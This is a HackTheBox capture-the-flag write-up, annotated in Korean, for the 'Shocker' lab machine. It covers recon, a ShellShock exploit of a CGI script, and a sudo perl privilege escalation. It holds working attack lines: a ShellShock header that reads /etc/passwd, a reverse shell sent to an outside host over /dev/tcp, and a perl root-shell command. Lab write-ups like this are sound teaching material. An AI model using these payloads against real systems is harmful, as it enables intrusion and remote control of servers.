# Shocker - HackTheBox
## Recon
```bash
sudo nmap -p 80,2222 -sC -sV -vv -oA shocker 10.10.10.56
```
<img width="1104" height="380" alt="image" src="https://github.com/user-attachments/assets/bb9e0e0b-532b-4d45-9158-89437b8dc241" />

- HTTP(80)
- SSH(2222)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.10.56

curl -IL http://10.10.10.56
```
<img width="1104" height="317" alt="image" src="https://github.com/user-attachments/assets/e930f386-96a3-4e5e-81b8-2c4ea995d250" />

### gobuster
- `Apache`의 디렉토리를 탐색할때 `/cgi-bin`이 파일로 취급되는 경우가 있어 `/cgi-bin/`를 wordlist에 추가해서 실행해줘야 한다.
```bash
sudo sed -i '1i /cgi-bin/' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.56
```
<img width="1104" height="405" alt="image" src="https://github.com/user-attachments/assets/5ec66e5d-b5f1-449f-8afc-ca87445b16ff" />

### ShellShock
- `ShellShock`의 경우 테스트를 해봐야 취약한지 알기 때문에 cgi 스크립트 파일을 찾아 각 파일에 테스트.
- `user.sh`스크립트 발견.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin -x cig,sh,py,pl
```
<img width="1104" height="368" alt="image" src="https://github.com/user-attachments/assets/54b05552-12b7-495d-9deb-db98471e319a" />

<br>
<br>

- `ShellShock`테스트 성공.
```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.10.56/cgi-bin
/user.sh
```
<img width="1104" height="252" alt="image" src="https://github.com/user-attachments/assets/ce4015d9-4183-440c-b5fe-000449949a06" />

<br>
<br>

- 리버스 셸 시도.
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >&/dev/tcp/10.10.16.4/80 0>&1' http://10.10.10.56/cgi-bin/user.sh
```
<img width="1104" height="82" alt="image" src="https://github.com/user-attachments/assets/622b9e5e-9bcf-4ce5-897f-af13bda59af2" />

<br>
<br>

- 셸 획득.
<img width="1104" height="159" alt="image" src="https://github.com/user-attachments/assets/eea78447-5356-45b2-ad31-578b62535c08" />

---
## Privesc
- `/usr/bin/perl`를 `root`권한으로 실행 가능.
```bash
sudo -l
```
<img width="1104" height="134" alt="image" src="https://github.com/user-attachments/assets/bd498d59-eecb-4115-a3ff-ea53554dddd3" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/perl/
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```
<img width="1104" height="61" alt="image" src="https://github.com/user-attachments/assets/9aed6534-1913-4a09-81ff-b5db6a327ad1" />

---
## FLAG
- `/home/shelly/user.txt`
<img width="1104" height="230" alt="image" src="https://github.com/user-attachments/assets/da1dc605-4153-4452-94f9-1ca9b046b63d" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="177" alt="image" src="https://github.com/user-attachments/assets/7b1388df-8b79-41e6-b49e-0a84b5a76604" />










